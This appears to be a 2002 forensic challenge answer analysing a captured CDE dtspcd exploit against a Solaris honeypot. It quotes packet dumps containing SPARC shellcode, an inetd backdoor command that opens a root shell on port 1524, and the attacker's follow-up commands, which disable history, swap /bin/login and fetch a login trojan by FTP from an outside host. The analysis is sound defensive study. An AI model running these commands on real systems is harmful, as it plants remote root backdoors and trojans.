@@ -1,0 +1,198 @@
+
+Challenge for 01 April 2002 - Results                    
+
+Andrea Barisani (lcars@infis.univ.trieste.it)
+
+------------------------------------------------------------------------
+
+1. What is a NOP slide, and how is this one different from the NOP slide
+   in the rpc.statd exploit in Scan10?
+
+A NOP is a null operation, a code that do nothing and that's usually 
+inserted before a shellcode in order to make the return address computation 
+more easy, that's because is very difficult determining the exact position 
+of the beginning of the stack, a NOP padding (or NOP slide) is a sequence of 
+NOP. The NOP instruction is architecture dependent.  
+
+See the excellent 'Smashing The Stack For Fun And Profit' for a detailed
+description.
+
+The rpc.statd exploit pad the standard assembler "0x90" NOP instruction, 
+this exploit pad the sparc oriented byte sequence 80 1C 40 11.
+
+[**] EXPLOIT CDE dtspcd exploit attempt [**]
+01/08-14:46:07.042661 8:0:20:F6:D3:58 -> 0:E0:1E:60:70:40 type:0x800 len:0x5EA
+208.61.1.160:3595 -> 172.16.1.102:6112 TCP TTL:48 TOS:0x0 ID:41409 IpLen:20 DgmLen:1500 DF
+***AP*** Seq: 0xFEE08C48  Ack: 0x5F82F43E  Win: 0x3EBC  TcpLen: 32
+TCP Options (3) => NOP NOP TS: 463986953 4159062 
+30 30 30 30 30 30 30 32 30 34 31 30 33 65 30 30  0000000204103e00
+30 34 20 20 34 20 00 00 00 31 30 00 80 1C 40 11  04  4 ...10...@.
+80 1C 40 11 10 80 01 01 80 1C 40 11 80 1C 40 11  ..@.......@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+80 1C 40 11 80 1C 40 11 80 1C 40 11 80 1C 40 11  ..@...@...@...@.
+
+... and so on
+
+------------------------------------------------------------------------
+
+2. The attack was on 08 Jan, 2002. Would Snort have generated an alert
+   then for the attack?
+
+Yes, the signature "SHELLCODE sparc NOOP" would have detected the exploit 
+attempt.
+
+------------------------------------------------------------------------
+
+3. In the exploit code, the command "/bin/sh sh -i" is given, what is its
+   purpose, and why is 'sh' shown twice?
+
+In the exploit packet payload we can see the following commands: 
+
+/bin/ksh -c  echo "ingreslock stream tcp nowait root /bin/sh sh -i">/tmp/x;
+/usr/sbin/inetd -s /tmp/x;
+sleep 10;
+/bin/rm -f /tmp/x 
+
+...
+20 BF FF FF 7F FF FF FF 90 03 E0 34 92 23 E0 20   ..........4.#. 
+A2 02 20 0C A4 02 20 10 C0 2A 20 08 C0 2A 20 0E  .. ... ..* ..* .
+D0 23 FF E0 E2 23 FF E4 E4 23 FF E8 C0 23 FF EC  .#...#...#...#..
+82 10 20 0B 91 D0 20 08 2F 62 69 6E 2F 6B 73 68  .. ... ./bin/ksh
+20 20 20 20 2D 63 20 20 65 63 68 6F 20 22 69 6E      -c  echo "in
+67 72 65 73 6C 6F 63 6B 20 73 74 72 65 61 6D 20  greslock stream 
+74 63 70 20 6E 6F 77 61 69 74 20 72 6F 6F 74 20  tcp nowait root 
+2F 62 69 6E 2F 73 68 20 73 68 20 2D 69 22 3E 2F  /bin/sh sh -i">/
+74 6D 70 2F 78 3B 2F 75 73 72 2F 73 62 69 6E 2F  tmp/x;/usr/sbin/
+69 6E 65 74 64 20 2D 73 20 2F 74 6D 70 2F 78 3B  inetd -s /tmp/x;
+73 6C 65 65 70 20 31 30 3B 2F 62 69 6E 2F 72 6D  sleep 10;/bin/rm
+20 2D 66 20 2F 74 6D 70 2F 78 20 41 41 41 41 41   -f /tmp/x AAAAA
+41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+41 41 41 41 41 41 41 41                          AAAAAAAA
+
+the purpose is to spawn an interactive root shell wrapped with inetd 
+remotely reachable at port 1524 (ingreslock). The 'sh -i' is placed 
+in the 'server program argument' field of the inetd configuration file 
+which contains the actual program and its arguments, /bin/sh is the 
+'server program' field. The '-i' flag is for 'interactive'. 
+
+------------------------------------------------------------------------
+
+4. The attacker executed a variety of commands on the hacked Solaris box.
+   Which commands were automated by the exploit, which commands were
+   manual by the attacker himself?
+
+The commands described in answer three are automated because they are 
+part of the exploit.
+
+After the exploit attempt the attacker has issued the following commands
+(replies are also shown):
+
+uname -a;ls -l /core /var/dt/tmp/DTSPCD.log;PATH=/usr/local/bin:/usr/bin:
+/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;export PATH;
+echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`
+
+# SunOS buzzy 5.8 Generic_108528-03 sun4u sparc SUNW,Ultra-5_10
+/core: No such file or directory
+/var/dt/tmp/DTSPCD.log: No such file or directory
+BD PID(s): 3476
+
+# w
+  8:47am  up 11:24,  0 users,  load average: 0.12, 0.04, 0.02
+User     tty           login@  idle   JCPU   PCPU  what
+# unset HISTFILE
+# cd /tmp
+mkdir /usr/lib
+# mkdir: Failed to make directory "/usr/lib"; File exists
+# mv /bin/login /usr/lib/libfl.k
+
+It's unlikely an automation of the exploit, so most probably they came from the
+attacker itself (likely cutted and pasted).
+
+Then an ftp connection is made, downloading a 89776 long 32-Bit Sparc 
+executable, a login trojan.
+
+# ftp 64.224.118.115
+ftp
+ftp: ioctl(TIOCGETP): Invalid argument
+Password:a@
+cd pub
+binary
+get sun1
+bye
+Name (64.224.118.115:root): # 
+# ls
+ps_data
+sun1
+# chmod 555 sun1
+# mv sun1 /bin/login
+# # 
+
+------------------------------------------------------------------------
+
+5. What is sun1, and how does it work?
+
+sun1 is a login trojan grabbed via ftp as shown in answer number four.
+
+# file sun1
+sun1: ELF 32-bit MSB executable, SPARC, version 1, statically linked, stripped
+
+we know that it's a login trojan from the "mv sun1 /bin/login" command, a 
+'strings' on the excutable shows apart from standard login instructions the 
+string '/usr/lib/libfl.k', the link to the original login moved by the attacker
+with "mv /bin/login /usr/lib/libfl.k". The string 'pirc' is also shown, it could
+probably be the trojan password.
+
+------------------------------------------------------------------------
+
+6. What did you learn from this exercise?
+
+Well I haven't learn anything new but practice with data capture files and
+snort, tcpflows, tcpdump is always a good thing ;)
+
+------------------------------------------------------------------------
+
+7. How long did this challenge take you?
+
+Almost 1 hour (I know, I know I could have spent more time and write a nicer 
+report but it's a wonderful sunny day here ;) 
+
+------------------------------------------------------------------------
+
+Bonus Question:
+  One of the commands executed during the attack is
+
+  echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print
+  $2}'`
+
+  What is the purpose of this command and what does 'BD' stand for?
+
+grep the output of ps -fed (excluding the entry created by grep itself)
+looking for the inetd process executed by the command 
+'/usr/sbin/inetd -s /tmp/x' and print out the PID. "BD PID(s)" means
+backdoor pids :)
+
+------------------------------------------------------------------------
+
+Appendix - Tools used
+
+I've used: 
+	
+	- tcpdump for timeline reconstruction
+	- snort for packets and session analysis and alert triggering test
+	- tcpflows for session analysis and sun1 binary extraction
+	- google :)
+
+------------------------------------------------------------------------
